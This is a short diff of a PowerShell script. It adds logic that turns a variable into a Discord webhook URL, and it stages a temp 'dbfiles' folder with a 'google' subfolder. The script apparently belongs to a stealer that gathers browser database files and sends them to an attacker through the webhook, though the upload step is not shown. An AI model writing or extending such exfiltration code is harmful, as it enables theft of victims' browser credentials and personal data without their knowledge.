@@ -1,5 +1,8 @@
 
 $dc = "$dc"
+if ($dc.Length -lt 120){
+	$dc = ("https://discord.com/api/webhooks/" + "$dc")
+}
 $temp = [System.IO.Path]::GetTempPath() 
 $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
 $googledest = Join-Path -Path $tempFolder -ChildPath 'google'
